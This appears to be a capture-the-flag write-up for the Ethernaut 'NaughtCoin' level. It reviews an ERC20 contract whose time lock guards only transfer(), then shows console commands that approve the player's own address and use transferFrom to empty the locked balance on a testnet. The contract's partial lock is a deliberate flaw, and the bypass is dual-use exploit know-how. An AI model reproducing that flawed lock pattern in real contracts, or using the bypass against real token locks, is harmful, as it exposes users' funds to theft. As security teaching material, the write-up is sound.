<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel15.svg">

# Target Contract Review

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = block.timestamp + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0') {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
     _;
    }
  } 
}
```

Challenge's message:

> NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

Say welcome this Solidity smart contract for an ERC-20 token called NaughtCoin. It inherits from the OpenZeppelin ERC20 contract, which provides standard functionality for ERC-20 tokens. The contract has an added functionality that prevents the initial owner (player) from transferring tokens until a certain time lock period has passed.

First of all, the contract imports the ERC20.sol file from the "openzeppelin-contracts-08" library, which contains the implementation of the ERC-20 standard. Then, there is a public variable called **timeLock** which is storing the timestamp until which the initial owner cannot transfer tokens. It is set to 10 years (365 days * 10) from the deployment of the contract. After then, **INITIAL_SUPPLY** public variable representing the total initial supply of NaughtCoin tokens. It is initialized to 1,000,000 tokens with 18 decimals. Later, the **player** variable is storing he address of the initial owner of the contract.

In the constructor, it setups classic deployment process. If you don't how to deploy ERC20 contract, you can visit [here.](https://hacken.io/discover/create-erc-20-token/)

In this step, we are looking into the rest of the contract. In the transfer() function, the contract **overrides the transfer function from the ERC20 contract**. It adds a modifier **lockTokens** to the transfer function, which restricts token transfers from the initial owner until the time lock has passed. If the sender (msg.sender) is the player address, the modifier checks if the current timestamp is greater than the timeLock. If it is, the transfer is allowed; otherwise, the transfer is rejected. What is more, if the sender is not the player address, the transfer is allowed without any time restrictions.

Next, there is a **lockTokens** modifier. It checks whether the sender is the player address:

- If it is, the modifier requires that the current timestamp is greater than the **timeLock** variable, effectively enforcing the time lock. If the condition is met, the modifier allows the function to proceed.
- If the sender is not the **player** address, the modifier allows the function to proceed without imposing any time restrictions.

# Subverting


```shell
(await contract.balanceOf(player)).toString()
'1000000000000000000000000'
```

(await contract.allowance(player, player)).toString()
'0'

See transaction in [etherscan.](https://sepolia.etherscan.io/tx/0xee4d5333cc4c60ddde903a5c938c01c705b34632224f36b6979b5b445fb1e34e)

```shell
await contract.approve(player, "1000000000000000000000000")
```

```shell
(await contract.allowance(player, player)).toString()
'1000000000000000000000000'
```

See transaction in [etherscan.](https://sepolia.etherscan.io/tx/0xe31cef4e74fa793caf8cda4c87b1341d0be88ff0df35137057fc8f1cbd4db4d2)

```shell
await contract.transferFrom(player,"0x80aCA4707d5A7B83B6Df80155ee46179AE678d2e","1000000000000000000000000")
```


```shell
(await contract.balanceOf(player)).toString()
'0'
```

Ethernaut's message:

> When using code that's not your own, it's a good idea to familiarize yourself with it to get a good understanding of how everything fits together. This can be particularly important when there are multiple levels of imports (your imports have imports) or when you are implementing authorization controls, e.g. when you're allowing or disallowing people from doing things. In this example, a developer might scan through the code and think that transfer is the only way to move tokens around, low and behold there are other ways of performing the same operation with a different implementation.

**_by wasny0ps_**
